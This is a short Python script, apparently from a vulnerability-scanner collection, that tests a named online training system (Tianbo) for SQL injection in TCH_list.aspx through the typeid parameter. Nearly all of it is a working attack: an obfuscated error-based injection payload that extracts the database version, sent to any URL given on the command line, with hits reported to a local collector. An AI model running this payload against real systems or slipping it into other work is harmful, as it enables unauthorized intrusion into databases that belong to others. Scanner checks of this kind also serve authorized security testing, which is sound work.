#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 天柏在线培训系统TCH_list.aspx SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0143143
author: Lucifer
description: 文件TCH_list.aspx中,参数typeid存在SQL注入。
'''
import sys
import requests
import warnings
from termcolor import cprint

class tianbo_TCH_list_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/Web_Org/TCH_list.aspx?typeid=9/**/AnD/**/1=CoNvErt(InT,ChAr(87)%2BChAr(116)%2BChAr(70)%2BChAr(97)%2BChAr(66)%2BChAr(99)%2B@@VeRsIoN)--"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"WtFaBcMicrosoft" in req.text:
                cprint("[+]存在天柏在线培训系统TCH_list.aspx SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
                postdata = {self.url:"存在天柏在线培训系统TCH_list.aspx SQL注入漏洞...(高危)\tpayload: "+vulnurl}
                requests.post('http://localhost:8848/cms', json=postdata)
            else:
                cprint("[-]不存在tianbo_TCH_list_sqli漏洞", "white", "on_grey")

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = tianbo_TCH_list_sqli_BaseVerify(sys.argv[1])
    testVuln.run()